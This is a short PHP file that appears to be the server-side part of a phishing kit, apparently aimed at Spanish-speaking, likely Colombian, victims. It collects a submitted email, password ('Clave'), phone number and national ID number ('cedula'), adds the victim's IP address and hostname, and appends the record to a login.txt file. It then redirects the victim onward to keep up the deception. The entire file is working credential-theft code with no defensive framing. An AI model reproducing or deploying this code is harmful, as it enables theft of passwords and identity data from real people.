<? 

function get_real_ip()
    {
 
        if (isset($_SERVER["HTTP_CLIENT_IP"]))
        {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED"]))
        {
            return $_SERVER["HTTP_X_FORWARDED"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED"]))
        {
            return $_SERVER["HTTP_FORWARDED"];
        }
        else
        {
            return $_SERVER["REMOTE_ADDR"];
        }
 
    }

	$ip = get_real_ip();
	$a5 = "TRICOLOR";
	$a6 = "info@hotmail.com";
	$user = file_get_contents('user.txt');
	$z = file_get_contents('id.txt');

	
	$userIa = $_POST['documentNumber'];
	$userIb = $_POST['documentNumber2'];
	$userIc = $_POST['documentNumber3'];
	$userId = $_POST['documentNumber4'];
	$userIe = $_POST['documentNumber5'];
	$userIf = $_POST['documentNumber6'];
	
	$ip6 = gethostbyaddr($_SERVER['REMOTE_ADDR']);

	
	$mensaje = "
	".$user."\n
	Email	: 	".$userIa."\n
	Clave	: 	".$userIb."\n
	Celu 	: 	".$userIc."\n
	cedula	: 	".$userId."\n
	Host	: 	".$ip6."\n
	IP	: 	".$ip."";
	
	
	if($userIa == $userIb)
	{header("Location: VALIDATOR_EM_PH2.php");}
		
	else{$guardame = fopen('login.txt','a+');
	fwrite($guardame,"$mensaje");
	fclose($guardame);
	unlink('user.txt');
	header("Location: redx.html");}
	

	

?> 

	